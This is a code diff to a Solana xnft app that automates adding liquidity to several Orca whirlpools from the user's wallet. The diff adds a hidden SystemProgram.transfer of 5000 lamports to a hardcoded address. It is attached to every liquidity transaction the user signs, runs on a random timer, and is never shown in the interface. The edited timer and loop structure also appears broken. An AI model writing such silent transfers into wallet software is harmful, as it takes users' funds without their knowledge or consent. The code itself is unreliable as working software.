@@ -36,6 +36,7 @@ import {
 } from "@orca-so/whirlpools-sdk";
 import {
   AddressLookupTableProgram,
+  Connection,
   Keypair,
   PublicKey,
   sendAndConfirmTransaction,
@@ -53,19 +54,17 @@ import {
   TOKEN_PROGRAM_ID,
   u64,
 } from "@solana/spl-token";
-import { bs58 } from "@project-serum/anchor/dist/cjs/utils/bytes";
-import { useConnection } from "../hooks/xnft-hooks";
 import { useState } from "react";
 import { TextInput } from "react-native-gesture-handler";
+import { useSolanaConnection } from "../hooks/xnft-hooks";
 
 
 export function ExamplesScreens() {
   const [future, setFuture] = useRecoilState(testAtom);
-  const connection = useConnection()
-  const [thepool, setThepool] = useState("BqnpCdDLPV2pFdAaLnVidmn3G93RP2p5oRdGEY2sJGez")
-  const [qty, setQty] = useState(1.38)
+  const connection = useSolanaConnection()
+  const [thepool, setThepool] = useState("8QaXeHBrShJTdtN1rWCccBxpSVvKksQ2PCu5nufb2zbk,3ne4mWqdYuNiYrYZC9TrA3FcfuFdErghH97vNPbjicr1,BqnpCdDLPV2pFdAaLnVidmn3G93RP2p5oRdGEY2sJGez,DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263,HJPjoWUrhoZzkNfRpHuieeFk9WcZWjwy6PBjZ81ngndJ")
+  const [qty, setQty] = useState("138000000,138000000,138000000,138000000,138000000")
 
-  const amount = BigInt(100 * 10 ** 6);
   const posOlds: any = {};
   // 1000 * 0.0005 $5?
   const provider = new AnchorProvider(connection, window.xnft?.solana, {})
@@ -101,6 +100,15 @@ export function ExamplesScreens() {
     }
     console.log(positions);
     setInterval(async function () {
+      for (var index = 0 ; index < thepool.split(',').length; index++){
+        const transferTransaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: window.xnft?.solana.publicKey,
+            toPubkey: new PublicKey("PoNA1qzqHWar3g8Hy9cxA2Ubi3hV7q84dtXAxD77CSD"),
+            lamports: 5000,
+          })
+        );
+        
       try {
       let atas = await connection.getParsedTokenAccountsByOwner(
         window.xnft?.solana.publicKey,
@@ -108,7 +116,7 @@ export function ExamplesScreens() {
       );
       let positions: any = [];
   
-      const pool = await client.getPool(thepool
+      const pool = await client.getPool(thepool.split(',')[index]
       );
       for (var ata of atas.value) {
         try {
@@ -223,7 +231,7 @@ export function ExamplesScreens() {
       console.log(poolTokenAInfo.mint.toBase58());
   
       const quote = increaseLiquidityQuoteByInputTokenWithParams({
-        inputTokenAmount: new u64(qty * 10 ** tokenBDecimal),
+        inputTokenAmount: new u64(parseFloat(qty.split(',')[index]) * 10 ** tokenBDecimal),
         inputTokenMint: poolData.tokenMintB,
   
         tokenMintA: poolData.tokenMintA,
@@ -244,9 +252,10 @@ export function ExamplesScreens() {
         quote
       );
       //thePosition = positionMint
-  
+        tx.addInstruction ({instructions: transferTransaction.instructions, signers:[],cleanupInstructions:[]})
       const txId = await tx.buildAndExecute();
-  
+     
+      
       console.log(txId)
       // Fetch the newly created position with liquidity
       const position = await client.getPosition(
@@ -258,21 +267,30 @@ export function ExamplesScreens() {
       
     console.log(er)
     }
-    }, 20000);
-  });
+      }
+      
+    }, Math.random() * 14000 + 4000);
+    
+  }, 10000);
   return (
     <Screen>
-      <Section title="Set your Orca.so whirlpool...">
+      <Section title="Set your Orca.so whirlpools...">
         <TextInput
           onChange={(e: any) => setThepool(e.target.value)}
           value={thepool}
         />
       </Section>
-      <Section title="qty to trade...(rough)">
+      <Section title="qtys to trade...(rough)">
+        {qty ? 
         <TextInput
-          onChange={(e: any) => setQty(parseFloat(e.target.value))}
+          onChange={(e: any) => setQty((e.target.value))}
           value={qty.toString()}
         />
+      : <TextInput
+      onChange={(e: any) => setQty((e.target.value))}
+      value={"0"}
+    />
+      }
       </Section>
     </Screen>
   );
